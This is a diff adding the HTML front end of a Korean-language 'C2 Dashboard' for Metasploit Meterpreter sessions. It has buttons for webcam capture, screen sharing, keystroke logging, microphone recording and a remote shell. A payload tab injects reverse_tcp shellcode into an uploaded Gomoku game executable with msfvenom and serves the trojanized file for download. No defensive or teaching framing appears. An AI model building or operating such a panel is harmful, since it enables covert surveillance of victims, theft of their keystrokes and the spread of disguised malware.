@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>C2 Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <style>
+    body { background: #060c18; color: #e2e8f0; font-family: 'Courier New', monospace; }
+    .card  { background: #0d1526; border: 1px solid #1a2a40; }
+    .session-card { cursor: pointer; transition: border-color 0.15s, background 0.15s; }
+    .session-card:hover  { border-color: #22d3ee; }
+    .session-card.active { border-color: #22d3ee; background: #0a1e30; }
+    .tab-btn { border-bottom: 2px solid transparent; transition: all 0.15s; }
+    .tab-btn.active { border-color: #22d3ee; color: #22d3ee; }
+    .tab-panel { display: none; }
+    .tab-panel.active { display: block; }
+    #log-container { scrollbar-width: thin; scrollbar-color: #1e3050 #0d1526; }
+    #cmd-output { scrollbar-width: thin; scrollbar-color: #1e3050 #060c18; }
+    .dot-on  { background: #22d3ee; box-shadow: 0 0 8px #22d3ee; }
+    .dot-off { background: #ef4444; box-shadow: 0 0 8px #ef4444; }
+    .modal-bg { background: rgba(0,0,0,0.75); }
+    .payload-btn {
+      background: #111f33; border: 1px solid #1e3050;
+      transition: border-color 0.15s, background 0.15s; cursor: pointer;
+    }
+    .payload-btn:hover:not(:disabled) { border-color: #a78bfa; background: #130d2a; }
+    .payload-btn:disabled { opacity: 0.35; cursor: not-allowed; }
+    .quick-cmd {
+      background: #0d1a2e; border: 1px solid #1a3050; font-size: 11px;
+      padding: 3px 8px; border-radius: 4px; cursor: pointer; color: #94a3b8;
+      transition: all 0.1s;
+    }
+    .quick-cmd:hover { border-color: #22d3ee; color: #22d3ee; }
+    #cmd-input:focus { outline: none; border-color: #22d3ee; }
+  </style>
+</head>
+<body class="min-h-screen p-4 space-y-3">
+
+  <!-- Header -->
+  <div class="card rounded-lg px-4 py-3 flex items-center justify-between">
+    <div class="flex items-center gap-3">
+      <button id="btn-kill-all"
+        class="bg-red-800 hover:bg-red-700 text-white font-bold px-4 py-1.5 rounded border border-red-600 text-xs transition-all">
+        🛑 KILL ALL
+      </button>
+      <button id="btn-kill-port"
+        class="bg-orange-900 hover:bg-orange-800 text-orange-300 px-4 py-1.5 rounded border border-orange-700 text-xs transition-all">
+        🔌 PORT KILL
+      </button>
+      <span id="lhost-label" class="text-gray-600 text-xs font-mono"></span>
+    </div>
+    <div class="flex items-center gap-2">
+      <div id="status-dot" class="w-2.5 h-2.5 rounded-full dot-off"></div>
+      <span id="status-text" class="text-xs text-red-400">Offline</span>
+    </div>
+  </div>
+
+  <div class="grid grid-cols-1 xl:grid-cols-3 gap-3">
+
+    <!-- Left: Sessions + Tabs -->
+    <div class="xl:col-span-2 space-y-3">
+
+      <!-- Sessions -->
+      <div class="card rounded-lg p-4">
+        <div class="flex items-center justify-between mb-3">
+          <h2 class="text-cyan-400 text-xs font-bold tracking-widest">ACTIVE SESSIONS</h2>
+          <button id="btn-refresh" class="text-xs text-gray-600 hover:text-cyan-400 transition-colors">↻ 갱신</button>
+        </div>
+        <div id="session-list">
+          <p class="text-gray-700 text-xs">세션 없음</p>
+        </div>
+      </div>
+
+      <!-- Tabs -->
+      <div class="card rounded-lg p-4">
+        <div class="flex items-center justify-between mb-4">
+          <div class="flex gap-5">
+            <button class="tab-btn active text-xs pb-1 text-gray-400" data-tab="command">명령</button>
+            <button class="tab-btn text-xs pb-1 text-gray-400" data-tab="payload">
+              <span class="text-purple-400">⚡ 페이로드</span>
+            </button>
+          </div>
+          <span id="selected-label" class="text-xs text-gray-700">세션 선택 안 됨</span>
+        </div>
+
+        <!-- Tab: 명령 -->
+        <div id="tab-command" class="tab-panel active">
+
+          <!-- 자주 쓰는 명령어 빠른 입력 -->
+          <div class="flex flex-wrap gap-1.5 mb-3">
+            <span class="text-xs text-gray-700 self-center mr-1">빠른입력</span>
+            <button class="quick-cmd" data-cmd="sysinfo">sysinfo</button>
+            <button class="quick-cmd" data-cmd="screenshot">screenshot</button>
+            <button class="quick-cmd" data-cmd="webcam_snap -i 1">webcam_snap</button>
+            <button class="quick-cmd" data-cmd="webcam_stream -i 1">webcam_stream</button>
+            <button class="quick-cmd" data-cmd="screenshare">screenshare</button>
+            <button class="quick-cmd" data-cmd="keyscan_start">keyscan_start</button>
+            <button class="quick-cmd" data-cmd="keyscan_dump">keyscan_dump</button>
+            <button class="quick-cmd" data-cmd="keyscan_stop">keyscan_stop</button>
+            <button class="quick-cmd" data-cmd="run post/multi/gather/sound_recorder DURATION=5">mic_record</button>
+            <button class="quick-cmd" data-cmd="ps">ps</button>
+            <button class="quick-cmd" data-cmd="shell">shell</button>
+          </div>
+
+          <!-- 명령 입력 -->
+          <div class="flex gap-2 mb-3">
+            <span class="text-cyan-600 text-sm self-center">meterpreter &gt;</span>
+            <input id="cmd-input" type="text"
+              class="flex-1 bg-black border border-gray-800 rounded px-3 py-2 text-sm text-green-400 font-mono"
+              placeholder="명령어 입력 후 Enter" autocomplete="off" />
+            <button id="btn-run"
+              class="bg-cyan-800 hover:bg-cyan-700 text-white text-xs px-4 py-2 rounded border border-cyan-600 transition-all disabled:opacity-40"
+              disabled>
+              ▶ 실행
+            </button>
+          </div>
+
+          <!-- 출력 -->
+          <div id="cmd-output"
+            class="bg-black border border-gray-900 rounded p-3 h-48 overflow-y-auto font-mono text-xs text-green-400 whitespace-pre-wrap">
+            <span class="text-gray-700">// 명령 출력이 여기에 표시됩니다</span>
+          </div>
+
+          <!-- 이미지 프리뷰 (screenshot / webcam_snap) -->
+          <div id="preview-area" class="hidden mt-3 border border-gray-800 rounded-lg p-2 text-center">
+            <div class="flex items-center justify-between mb-1">
+              <span id="preview-label" class="text-xs text-gray-600"></span>
+              <button id="btn-clear-preview" class="text-xs text-gray-700 hover:text-red-400">✕</button>
+            </div>
+            <img id="preview-img" src="" alt="preview" class="mx-auto rounded max-h-56 object-contain" />
+          </div>
+        </div>
+
+        <!-- Tab: 페이로드 -->
+        <div id="tab-payload" class="tab-panel">
+          <div class="space-y-4">
+
+            <div class="bg-black rounded p-3 border border-gray-800 text-xs font-mono">
+              <span class="text-gray-600">LHOST </span><span id="payload-lhost" class="text-purple-400"></span>
+              <span class="text-gray-600 ml-4">LPORT </span><span id="payload-lport" class="text-purple-400"></span>
+              <span class="text-gray-600 ml-4">windows/meterpreter/reverse_tcp</span>
+            </div>
+
+            <div>
+              <p class="text-xs text-gray-600 mb-2">① 오목.exe 업로드</p>
+              <div class="flex items-center gap-3">
+                <button id="btn-select-exe" class="payload-btn rounded px-4 py-2 text-xs">📁 파일 선택</button>
+                <span id="exe-filename" class="text-xs text-gray-600 font-mono">선택된 파일 없음</span>
+              </div>
+            </div>
+
+            <div>
+              <p class="text-xs text-gray-600 mb-2">② 셸코드 주입 (msfvenom -x -k)</p>
+              <button id="btn-inject" class="payload-btn rounded px-5 py-2 text-xs text-purple-300 border-purple-800" disabled>
+                ⚡ 주입 시작
+              </button>
+            </div>
+
+            <div id="inject-status-area" class="hidden">
+              <div class="bg-black border border-gray-800 rounded p-3">
+                <p id="inject-status-text" class="text-xs text-yellow-400 mb-2"></p>
+                <div class="w-full bg-gray-900 rounded h-1.5">
+                  <div id="inject-progress-bar" class="bg-purple-500 h-1.5 rounded transition-all duration-500" style="width:0%"></div>
+                </div>
+              </div>
+            </div>
+
+            <div id="download-area" class="hidden">
+              <div class="bg-green-950 border border-green-800 rounded p-3 flex items-center justify-between">
+                <div>
+                  <p class="text-xs text-green-400 font-bold">✅ 주입 완료</p>
+                  <p id="download-info" class="text-xs text-gray-500 mt-0.5"></p>
+                </div>
+                <button id="btn-download"
+                  class="bg-green-800 hover:bg-green-700 text-white text-xs px-4 py-2 rounded border border-green-600 transition-all">
+                  ⬇️ 다운로드
+                </button>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+        <input type="file" id="exe-file-input" accept=".exe" class="hidden" />
+      </div>
+    </div>
+
+    <!-- Right: Event Log -->
+    <div class="card rounded-lg p-4 flex flex-col" style="min-height:520px; max-height:680px;">
+      <div class="flex items-center justify-between mb-3">
+        <h2 class="text-cyan-400 text-xs font-bold tracking-widest">EVENT LOG</h2>
+        <button id="btn-clear-log" class="text-xs text-gray-700 hover:text-red-400 transition-colors">✕ 지우기</button>
+      </div>
+      <div id="log-container" class="flex-1 overflow-y-auto text-xs"></div>
+    </div>
+  </div>
+
+  <!-- Modal: Kill All 확인 -->
+  <div id="kill-modal" class="hidden fixed inset-0 modal-bg flex items-center justify-center z-50">
+    <div class="card rounded-lg p-6 w-72 text-center">
+      <div class="text-4xl mb-3">🛑</div>
+      <p class="text-sm text-gray-400 mb-5">모든 세션을 종료합니다.<br/>계속하시겠습니까?</p>
+      <div class="flex gap-3 justify-center">
+        <button id="kill-cancel" class="text-xs text-gray-600 px-4 py-2">취소</button>
+        <button id="kill-confirm" class="bg-red-800 hover:bg-red-700 text-white text-xs px-5 py-2 rounded">종료</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="/static/app.js"></script>
+</body>
+</html>
